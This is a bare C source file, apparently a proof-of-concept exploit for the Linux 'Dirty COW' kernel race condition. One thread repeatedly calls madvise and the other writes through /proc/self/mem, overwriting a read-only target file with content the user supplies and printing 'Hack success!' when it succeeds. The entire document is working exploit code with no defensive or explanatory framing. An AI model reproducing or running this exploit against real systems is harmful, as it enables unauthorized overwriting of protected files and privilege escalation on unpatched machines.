#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdint.h>

void *map;
int f;
struct stat st;
char *name;
int bSuccess = 0;

void *madviseThread(void *arg)
{
    char *str;
    str = (char *)arg;
    int f = open(str, O_RDONLY);
    int i = 0, c = 0;
    char buffer1[1024], buffer2[1024];
    int size;
    lseek(f, 0, SEEK_SET);
    size = read(f, buffer1, sizeof(buffer1));
    while(i < 100000000)
    {
        c += madvise(map, 100, MADV_DONTNEED);
        lseek(f, 0, SEEK_SET);
        size = read(f, buffer2, sizeof(buffer2));
        if(size > 0 && strcmp(buffer1, buffer2))
        {
            printf("Hack success!\n\n");
            bSuccess = 1;
            break;
        }
        i++;
    }
    close(f);
    printf("madvise %d\n\n", c);
}

void *procselfmemThread(void *arg)
{
    char *str;
    str = (char *)arg;

    int f = open("/proc/self/mem", O_RDWR);
    int i = 0, c = 0;
    while(i < 100000000 && !bSuccess)
    {
        lseek(f, (uintptr_t)map, SEEK_SET);
        c += write(f, str, strlen(str));
        i++;
    }
    close(f);
    printf("procselfmem %d \n\n", c);
}

int main(int argc, char *argv[])
{
    if(argc < 3)
    {
        (void)fprintf(stderr, "%s\n", "usage: dirtycow target_file new_content");
        return 1;
    }
    pthread_t pth1, pth2;

    f = open(argv[1], O_RDONLY);
    fstat(f, &st);
    name = argv[1];

    map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
    printf("mmap %zx\n\n", (uintptr_t)map);

    pthread_create(&pth1, NULL, madviseThread, argv[1]);
    pthread_create(&pth2, NULL, procselfmemThread, argv[2]);

    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);

    close(f);

    return 0;
}
